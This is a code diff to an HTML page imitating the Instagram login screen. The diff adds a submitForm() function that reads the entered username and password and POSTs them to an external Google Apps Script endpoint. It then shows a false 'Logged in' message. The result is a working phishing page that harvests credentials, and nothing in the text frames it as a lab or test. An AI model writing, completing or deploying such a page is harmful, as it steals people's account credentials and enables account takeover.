@@ -90,7 +90,7 @@
       color: #999;
       text-decoration: none;
       margin: 0 5px;
-      pointer-events: none; /* Makes links non-clickable */
+      pointer-events: none;
     }
 
     .divider {
@@ -102,12 +102,12 @@
 <body>
   <div class="container">
     <div class="logo">Instagram</div>
-    <input type="text" placeholder="Phone number, username, or email">
+    <input type="text" id="username" placeholder="Phone number, username, or email">
     <div class="password-container">
       <input type="password" id="password" placeholder="Password">
       <span class="toggle-text" onclick="togglePassword()">Show</span>
     </div>
-    <button type="button">Log In</button>
+    <button type="button" onclick="submitForm()">Log In</button>
     <div class="links">
       <a href="#">Forgot password?</a>
     </div>
@@ -130,6 +130,21 @@
         passwordInput.type = "password";
         toggleText.textContent = "Show";
       }
+    }
+
+    function submitForm() {
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwB7774L0QICIFgfZpQT6bhFQqNGykDiSZcVKSjDROhbIGhsXMn6axFNSm4yewpMgv9_A/exec'; // <-- Replace this!
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+      });
+
+      alert("Logged in");
     }
   </script>
 </body>
